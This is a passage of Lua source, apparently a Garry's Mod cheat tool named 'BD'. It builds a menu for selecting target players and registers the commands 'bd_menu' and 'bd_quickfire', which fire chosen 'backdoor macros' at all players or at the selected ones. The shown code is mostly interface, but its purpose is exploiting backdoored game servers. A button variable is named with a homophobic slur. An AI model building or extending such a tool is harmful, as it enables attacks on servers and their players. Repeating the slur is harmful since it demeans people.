    target1:SetTextColor(Color(255, 255, 255, 255))

    target1.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    target1.DoClick = function()

        for _, p in pairs(player.GetAll()) do

            if not table.HasValue( selectedplayers, p ) then 

                table.insert( selectedplayers, p )

            end

        end

    end



    local target2 = vgui.Create("DButton", BDMenu)

    target2:SetSize( 40, 20 )

    target2:SetPos( 565, 295 )

    target2:SetText("None")

    target2:SetTextColor(Color(255, 255, 255, 255))

    target2.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    target2.DoClick = function()

        table.Empty( selectedplayers )

    end



    local target2 = vgui.Create("DButton", BDMenu)

    target2:SetSize( 20, 20 )

    target2:SetPos( 610, 295 )

    target2:SetText("Me")

    target2:SetTextColor(Color(255, 255, 255, 255))

    target2.Paint = function(panel, w, h)

        surface.SetDrawColor(100, 100, 200 ,255)

        surface.DrawOutlinedRect(0, 0, w, h)

        surface.SetDrawColor(0, 0, 50 ,155)

        surface.DrawRect(0, 0, w, h)

    end

    target2.DoClick = function()

        table.Empty( selectedplayers )

        table.insert( selectedplayers, LocalPlayer() )

    end







-- players list



for k, v in pairs( player.GetAll() ) do



    local plypanel2 = vgui.Create( "DPanel" )

    plypanel2:SetPos( 0, 0 )

    plypanel2:SetSize( 200, 25 )

    plypanel2.Paint = function() -- Paint function

        draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 150), false, false, false, false)

        if table.HasValue( selectedplayers, v ) then surface.SetDrawColor(Color(50, 255, 90, 255)) else surface.SetDrawColor(Color(50, 50, 90, 255)) end

        surface.DrawOutlinedRect(1, 1, plypanel2:GetWide() - 1 , plypanel2:GetTall() - 1)

    end



    local plyname = vgui.Create( "DLabel", plypanel2 )

    plyname:SetPos( 10, 5 )

    plyname:SetFont( "Trebuchet18" )

    local tcol = Color( 255, 255, 255 )

    if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end

  --  elseif BD.IsFriend( v ) then tcol = Color( 0, 255, 0 )

--    elseif BD.GetRank(v) != ( "user" or "guest" or "player" ) then tcol = Color( 255, 100, 0 ) end

    plyname:SetColor( tcol )

    plyname:SetText( v:Nick() )

    plyname:SetSize(180, 15)





    local faggot = vgui.Create("DButton", plypanel2)

    faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )

    faggot:SetPos( 0, 0 )

    faggot:SetText("")

    faggot.Paint = function(panel, w, h)

        return

    end

    faggot.DoClick = function()

        if table.HasValue( selectedplayers, v ) then 

            table.RemoveByValue( selectedplayers, v )

        else

            table.insert( selectedplayers, v )

        end

    end





    Plist4:AddItem( plypanel2 )



end





BD.GenerateBackdoorList( Plist, 1 )

BD.GenerateBackdoorList( Plist2, 2 )

BD.GenerateBackdoorList( Plist3, 3 )



end

concommand.Add("bd_menu", BD.BackdoorMenu)





function BD.QuickFireBackdoor()

if !BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then BD.ChatText( "You haven't even selected a macro to use ya dingus!", Color(255,155,155) ) return end

if BD.BDMacros[selectedbackdoor].Type == ( 1 or 3 ) then BD.FormatCodeGlobal() else BD.FormatCodeTargeted() end

end

concommand.Add("bd_quickfire", BD.QuickFireBackdoor)
